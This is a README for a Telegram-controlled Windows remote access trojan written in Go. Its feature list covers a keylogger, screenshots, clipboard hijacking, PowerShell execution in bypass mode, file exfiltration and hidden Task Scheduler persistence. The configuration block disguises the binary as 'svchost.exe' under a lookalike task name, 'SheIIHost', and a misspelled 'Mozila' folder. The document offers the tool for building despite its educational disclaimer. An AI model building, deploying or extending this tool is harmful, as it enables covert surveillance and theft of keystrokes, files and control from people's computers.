# tgRAT — Telegram-Based Windows Remote Administration Tool

[![Go Version](https://img.shields.io/badge/Go-1.20+-00ADD8?style=flat&logo=go)](https://golang.org)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat&logo=windows)](https://microsoft.com/windows)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

> **⚠️ DISCLAIMER & ETHICAL USE ONLY**  
> This software is developed strictly for educational purposes, authorized penetration testing, security research, and administrative tasks in controlled laboratory environments. Unauthorized access to computer systems or running this software on devices without explicit written permission from the owner is illegal and violates local, state, and international cyber laws. The author assumes no liability for any misuse or damages caused by this program.

---

## 📌 Overview

**tgRAT** is a lightweight Remote Administration Tool (RAT) engineered in **Go (Golang)** for Windows environments. It leverages the **Telegram Bot API** as an encrypted, asynchronous Command and Control (C2) channel, bypassing traditional NAT and firewall restrictions without requiring port forwarding or dedicated static servers.

All inbound commands and outbound telemetry (screen captures, execution logs, keystrokes, and files) are routed directly through your private Telegram bot chat, guarded by user authentication checks.

---

## ✨ Features

- **Encrypted C2 over HTTPS**: Communicates entirely via Telegram Bot API with sender verification (`AuthID`).
- **Automated Installation & Persistence**:
  - Automatically copies itself to `%APPDATA%\<FolderName>\<InstallName>`.
  - Configures persistence via Windows Task Scheduler (`Register-ScheduledTask` on user logon).
  - Automatically cleans visible `HKCU\...\Run` registry entries to maintain persistence via Task Scheduler.
- **PowerShell Remote Execution**:
  - Runs arbitrary PowerShell scripts with a 15-second safety timeout.
  - Returns command output as uploaded text files.
- **File System Operations**:
  - Directory listing (`/dir`) and navigation (`/cd`).
  - Remote file and folder download (`/download` — auto-compresses directories into `.zip` archives).
  - Executable launcher (`/run`).
- **Telemetry & Surveillance**:
  - **Screen Capture (`/scr`)**: Captures the primary display via `.NET Windows Forms` and uploads screenshots directly as photos.
  - **Keylogger (`/keylog`, `/keylogstop`)**: Low-level asynchronous keyboard monitoring using Win32 `GetAsyncKeyState`.
  - **Clipboard Interception (`/clipboard`)**: Inspect and overwrite clipboard contents in real-time.
- **Process & System Controls**:
  - Process enumerator (`/process`) and process killer (`/processkill` by PID or process name).
  - Minimize all active windows (`/collapse`).
  - Remote shutdown (`/off`).
- **Clean Self-Destruction (`/selfdestruct`)**:
  - Unregisters scheduled tasks.
  - Spawns a delayed background CMD process to wipe the installation directory and terminates execution.

---

## 🕹️ Command Reference

| Command | Arguments | Description |
| :--- | :--- | :--- |
| `/start` | None | Displays help menu with all available bot commands |
| `/powershell <cmd>` | `<cmd>` | Executes PowerShell script in bypass mode with a 15-second timeout |
| `/dir` | None | Lists items (files & directories) in the current working path |
| `/cd <path>` | `<path>` | Changes working directory to specified path |
| `/download <path>` | `<path>` | Uploads file or recursively compresses directory into `.zip` |
| `/run <path>` | `<path>` | Launches specified application or script silently |
| `/scr` | None | Takes a screenshot of the primary display and sends image |
| `/keylog` | None | Starts background keystroke logging to memory/temp file |
| `/keylogstop` | None | Stops keystroke logger and uploads captured keystroke log |
| `/process` | None | Lists running tasks and processes (`tasklist`) |
| `/processkill <target>`| `<PID>` or `<Name>` | Terminates process forcefully (`taskkill /F`) |
| `/clipboard` | None | Retrieves current system clipboard contents |
| `/clipboard <text>` | `<text>` | Overwrites system clipboard with specified string |
| `/collapse` | None | Minimizes all open windows (`Win + D` simulation) |
| `/off` | None | Initiates immediate host machine shutdown (`shutdown /s /t 0`)|
| `/selfdestruct` | None | Removes persistence, deletes installed files, and exits |

---

## ⚙️ Configuration

Before building the binary, update the configuration constants in `main.go`:

```go
// --- CONFIGURATION ---
const (
	BotToken    = "YOUR_TELEGRAM_BOT_TOKEN"   // Obtain from @BotFather
	AuthID      = 123456789                  // Your personal numeric Telegram User ID
	TaskName    = "SheIIHost"                 // Task Scheduler task identifier
	InstallName = "svchost.exe"               // Executable disguise name
	FolderName  = "Mozila"                    // Installation directory inside %APPDATA%
)
